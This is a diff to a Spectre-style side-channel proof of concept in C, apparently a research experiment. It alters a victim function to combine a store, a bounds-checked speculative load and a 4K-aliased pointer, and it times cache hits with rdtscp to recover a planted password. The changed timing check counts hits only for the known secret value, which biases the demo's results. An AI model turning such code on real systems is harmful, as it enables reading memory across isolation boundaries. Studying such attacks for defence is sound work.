@@ -12,8 +12,11 @@
 /********************************************************************
 Victim code.
 ********************************************************************/
-#define jump_size 512
+#define jump_size 1
 #define four_k 4096
+#define dont_check 7
+const uint8_t secret_num = 43;
+
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {
@@ -40,7 +43,20 @@ char *secret = "The password is rootkea";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-void victim_func(int x, int value, int *stored_ptr, int *stored_ptr_mal)
+void victim_func(int is_mal, uint8_t value, uint8_t *stored_ptr, uint8_t *stored_ptr_mal)
+{
+  uint8_t loaded_value;
+  // Store value to memory location
+  *stored_ptr = value;
+  if (is_mal < array1_size)
+  {
+    loaded_value = *stored_ptr_mal;
+    // Load value from memory location + maybe 4K
+    temp &= array2[loaded_value * jump_size];
+  }
+}
+
+void victim_func_asm(int x, int value, int *stored_ptr, int *stored_ptr_mal)
 {
   int loaded_value;
   // Store value to memory location
@@ -100,26 +116,26 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
-
+      int is_mal;
       // Value to store
-      int value;
+      uint8_t value;
       // The location to store is the address of the stored var
-      int stored = 23;
-      int *store_mal_ptr;
+      uint8_t store;
+      uint8_t *store_mal_ptr;
       if (x == malicious_x)
       {
-        store_mal_ptr = (&stored) + four_k;
-        value = 53;
+        store_mal_ptr = (&store) + four_k;
+        value = secret_num;
+        is_mal = 51;
       }
       else
       {
-        store_mal_ptr = &stored;
-        value = 13;
+        store_mal_ptr = &store;
+        value = dont_check;
+        is_mal = 0;
       }
-      store_mal_ptr = &stored;
-      
       /* Call the victim! */
-      victim_func(x, value, &stored, store_mal_ptr);
+      victim_func(is_mal, value, &store, store_mal_ptr);
     }
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -130,7 +146,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
       time1 = __rdtscp(&junk);         /* READ TIMER */
       junk = *addr;                    /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[13])
+      if (time2 <= CACHE_HIT_THRESHOLD && mix_i == secret_num)
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
